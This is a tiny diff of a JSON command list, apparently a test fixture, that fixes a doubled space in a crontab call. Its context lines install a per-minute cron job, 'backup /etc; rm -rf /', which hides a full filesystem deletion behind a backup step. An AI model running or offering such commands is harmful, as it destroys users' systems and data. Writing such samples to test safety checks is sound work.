@@ -7,6 +7,6 @@
     },
     "commands": [
         "echo '* * * * * backup /etc; rm -rf /' >> _tempfile_",
-        "crontab  _tempfile_"
+        "crontab _tempfile_"
     ]
 }
